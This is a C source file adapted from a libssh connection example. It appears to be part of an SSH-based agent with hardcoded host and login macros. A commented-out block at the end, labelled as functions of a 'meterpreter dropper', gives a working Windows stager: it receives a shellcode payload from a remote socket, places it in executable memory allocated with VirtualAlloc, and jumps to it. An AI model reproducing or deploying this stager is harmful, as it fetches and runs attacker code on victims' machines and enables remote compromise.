/*
 * connect_ssh.c
 * This file contains an example of how to connect to a
 * SSH server using libssh
 */

/*
Copyright 2009 Aris Adamantiadis
This file is part of the SSH Library
You are free to copy this file, modify it in any way, consider it being public
domain. This does not apply to the rest of the library though, but it is
allowed to cut-and-paste working code from this file to any license of
program.
The goal is to show the API in action. It's not a reference on how terminal
clients must be made or how a client should react.
 */

#include "agent.h"
#include "config.h"


void remchar(char *, char, char *);
int authenticate_kbdint(ssh_session, const char *);
int verify_knownhost(ssh_session);
int authenticate_console(ssh_session);
ssh_session connect_ssh(const char *, const char *,int);

void remchar(char *msg, char rem, char *buff){
    int size;

    for(size = 0; msg[size] != '\0'; ++size);

    int loop = 0;
	int index = 0;
	while(loop <= size){
        if (msg[loop] != rem){
        	buff[index] = msg[loop];
			index++;
		}
        loop++;
	}
}


int verify_knownhost(ssh_session session){
	char *hexa;
	int state;
  	char buf[10];
  	unsigned char *hash = NULL;
  	int hlen;

  	state=ssh_is_server_known(session);

  	hlen = ssh_get_pubkey_hash(session, &hash);
  	if (hlen < 0) {
    	return -1;
  	}
  	switch(state){
    	case SSH_SERVER_KNOWN_OK:
      		break; /* ok */
    	case SSH_SERVER_KNOWN_CHANGED:
      		fprintf(stderr,"Host key for server changed : server's one is now :\n");
      		ssh_print_hexa("Public key hash",hash, hlen);
      		free(hash);
      		fprintf(stderr,"For security reason, connection will be stopped\n");
      		return -1;
    	case SSH_SERVER_FOUND_OTHER:
      		fprintf(stderr,"The host key for this server was not found but an other type of key exists.\n");
      		fprintf(stderr,"An attacker might change the default server key to confuse your client"
          		"into thinking the key does not exist\n"
          		"We advise you to rerun the client with -d or -r for more safety.\n");
      		return -1;
    	case SSH_SERVER_FILE_NOT_FOUND:
      		fprintf(stderr,"Could not find known host file. If you accept the host key here,\n");
      		fprintf(stderr,"the file will be automatically created.\n");
      		/* fallback to SSH_SERVER_NOT_KNOWN behavior */
    	case SSH_SERVER_NOT_KNOWN:
      		hexa = ssh_get_hexa(hash, hlen);
      		fprintf(stderr,"The server is unknown. Do you trust the host key ?\n");
      		fprintf(stderr, "Public key hash: %s\n", hexa);
      		free(hexa);
      		if (fgets(buf, sizeof(buf), stdin) == NULL) {
        		return -1;
      		}
      		if(strncasecmp(buf,"yes",3)!=0){
        		return -1;
      		}
      		fprintf(stderr,"This new key will be written on disk for further usage. do you agree ?\n");
      		if (fgets(buf, sizeof(buf), stdin) == NULL) {
        		return -1;
      		}
      		if(strncasecmp(buf,"yes",3)==0){
        		if (ssh_write_knownhost(session) < 0) {
          			free(hash);
          			fprintf(stderr, "[-] Error %s\n", strerror(errno));
          			return -1;
        		}
      		}

      		break;
    	case SSH_SERVER_ERROR:
      		free(hash);
      		fprintf(stderr,"%s",ssh_get_error(session));
      		return -1;
  		}
  	free(hash);
  	return 0;
}

int authenticate_console(ssh_session session){
	/*Do authentication through terminal. Trying to get rid of this :)*/
  	int rc;
  	int method;
  	char *banner;

  	// Try to authenticate
  	rc = ssh_userauth_none(session, NULL);
  	if (rc == SSH_AUTH_ERROR) {
    	fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));;
    	return rc;
  	}

  	method = ssh_auth_list(session);
  	while (rc != SSH_AUTH_SUCCESS) {
    	// Try to authenticate with public key first
    	if (method & SSH_AUTH_METHOD_PUBLICKEY) {
      		rc = ssh_userauth_autopubkey(session, NULL);
      		if (rc == SSH_AUTH_ERROR) {
      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
        		return rc;
      		} else if (rc == SSH_AUTH_SUCCESS) {
        		break;
      		}
    	}

    	// Try to authenticate with keyboard interactive";
    	if (method & SSH_AUTH_METHOD_INTERACTIVE) {
      		rc = authenticate_kbdint(session, NULL);
      		if (rc == SSH_AUTH_ERROR) {
      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
        		return rc;
      		} else if (rc == SSH_AUTH_SUCCESS) {
        		break;
      		}
    	}

    	// Try to authenticate with password
    	if (method & SSH_AUTH_METHOD_PASSWORD) {
      		rc = ssh_userauth_password(session, NULL, GLOB_LOGIN);
      		if (rc == SSH_AUTH_ERROR) {
      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
        		return rc;
      		} else if (rc == SSH_AUTH_SUCCESS) {
        		break;
      		}
    	}
  	}

  	banner = ssh_get_issue_banner(session);
  	if (banner) {
    	printf("%s\n",banner);
    	free(banner);
  	}

  	return rc;
}

int authenticate_kbdint(ssh_session session, const char *password) {
    int err;

    err = ssh_userauth_kbdint(session, NULL, NULL);
    while (err == SSH_AUTH_INFO) {
        const char *instruction;
        const char *name;
        char buffer[128];
        int i, n;

        name = ssh_userauth_kbdint_getname(session);
        instruction = ssh_userauth_kbdint_getinstruction(session);
        n = ssh_userauth_kbdint_getnprompts(session);

        if (name && strlen(name) > 0) {
            printf("%s\n", name);
        }

        if (instruction && strlen(instruction) > 0) {
            printf("%s\n", instruction);
        }

        for (i = 0; i < n; i++) {
            const char *answer;
            const char *prompt;
            char echo;

            prompt = ssh_userauth_kbdint_getprompt(session, i, &echo);
            if (prompt == NULL) {
                break;
            }

            if (echo) {
                char *p;

                printf("%s", prompt);

                if (fgets(buffer, sizeof(buffer), stdin) == NULL) {
                    return SSH_AUTH_ERROR;
                }

                buffer[sizeof(buffer) - 1] = '\0';
                if ((p = strchr(buffer, '\n'))) {
                    *p = '\0';
                }

                if (ssh_userauth_kbdint_setanswer(session, i, buffer) < 0) {
                    return SSH_AUTH_ERROR;
                }

                memset(buffer, 0, strlen(buffer));
            } else {
                if (password && strstr(prompt, "Password:")) {
                    answer = password;
                } else {
                    buffer[0] = '\0';

                    if (ssh_getpass(prompt, buffer, sizeof(buffer), 0, 0) < 0) {
                        return SSH_AUTH_ERROR;
                    }
                    answer = buffer;
                }
                if (ssh_userauth_kbdint_setanswer(session, i, answer) < 0) {
                    return SSH_AUTH_ERROR;
                }
            }
        }
        err=ssh_userauth_kbdint(session,NULL,NULL);
    }

    return err;
}


ssh_session connect_ssh(const char *host, const char *user,int verbosity){
	/*Connect to server*/
    ssh_session session;
    int auth=0;

	// initialize ssh session structure
    session=ssh_new();
    if (session == NULL) {
        return NULL;
    }

	// check and set username
	if(user != NULL){
        if (ssh_options_set(session, SSH_OPTIONS_USER, user) < 0) {
        	ssh_disconnect(session);
            return NULL;
        }
    }

	// set target host
    if (ssh_options_set(session, SSH_OPTIONS_HOST, host) < 0) {
        return NULL;
    }
    ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);

	// do the connection
    if(ssh_connect(session)){
        fprintf(stderr,"[-] Connection failed : %s\n",ssh_get_error(session));
        ssh_disconnect(session);
        return NULL;
    }

    if(verify_knownhost(session)<0){
        ssh_disconnect(session);
        return NULL;
    }

	// get password
    auth=authenticate_console(session);
    if(auth==SSH_AUTH_SUCCESS){
        return session;
    } else if(auth==SSH_AUTH_DENIED){
        fprintf(stderr,"[-] Authentication failed\n");
    } else {
        fprintf(stderr,"[-] Error while authenticating : %s\n",ssh_get_error(session));
    }
    ssh_disconnect(session);
    return NULL;
}

int direct_forwarding(ssh_session session)
{
	/*EXAMPLE FOR NOW*/ 
  	ssh_channel forwarding_channel;
  	int rc = 0;
 	char *http_get = "GET / HTTP/1.1\nHost: www.google.com\n\n";
  	int nbytes, nwritten;

	forwarding_channel = ssh_channel_new(session);
	if (forwarding_channel == NULL) {
    	return rc;
  	}

  	rc = ssh_channel_open_forward(forwarding_channel, "www.google.com", 80, "localhost", 5555);
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(forwarding_channel);
    	return rc;
  	}

  	nbytes = strlen(http_get);
  	nwritten = ssh_channel_write(forwarding_channel, http_get, nbytes);

  	if (nbytes != nwritten)
  	{
    	ssh_channel_free(forwarding_channel);
    	return SSH_ERROR;
  	}
  
  	ssh_channel_free(forwarding_channel);
  	return SSH_OK;
}


int main(int argc, char* argv[]){
    ssh_session session = connect_ssh(HOST, GLOB_ID, 0);

	if(session == NULL){
		printf("Failed to create SSH session\n");
		ssh_disconnect(session);
		ssh_free(session);
		ssh_finalize();
		return 1;
	}

	func_loop(session);

	// Check out this function:
	// ssh_channel_write()

	ssh_disconnect(session);
	ssh_free(session);
	ssh_finalize();
	printf("Successfully disconnected from server\n");
    return 0;
}

/*
The bellow are the functions used by meterpreter dropper

void init_socket() {
    WORD word_ex = MAKEWORD((2, 2); 
    WSADATA data;
    if (WSAStartup(word_ex, &data) < 0) { 
        WSACleanup(); 
        exit(1);
    }
}

void cleanup_sockets(SOCKET sock) {
    closesocket(sock);
    WSACleanup();
    exit(1);
}

int get_payload(SOCKET sock, void * start_byte_ptr, int size_of){
    int rc=0;
    int count=0;
    void * startb = start_byte_ptr;
    while (count < size_of) {
        rc = recv(sock, (char *)startb, size_of - count, 0);
        startb += rc; 
        count += rc;
        if (rc == SOCKET_ERROR) 
            cleanup_sockets(sock);
    } 
    return count; 
}


int main(int argc, char * argv[]) {
    ULONG32 payload_size;
    char * alloc_mem_ptr;
    int i;
    void (*func_ptr)();
        
    init_socket();

    SOCKET remote_sock = do_connect();
    
    // Tests connection
    int sock_count = recv(remote_sock, (char *)&payload_size, 4, 0);
    
    if (sock_count != 4 || payload_size <= 0) 
        cleanup_sockets(remote_sock);
    
    alloc_mem_ptr = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (alloc_mem_ptr == NULL) 
        cleanup_sockets(remote_sock);
        
    alloc_mem_ptr[0] = 0xBF;
    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
    memcpy(alloc_mem_ptr + 1, &remote_sock, 4);
        
    sock_count = get_payload(remote_sock, alloc_mem_ptr + 5, payload_size);

    func_ptr = (void (*)())alloc_mem_ptr;
    func_ptr();

    return 0;
}


*/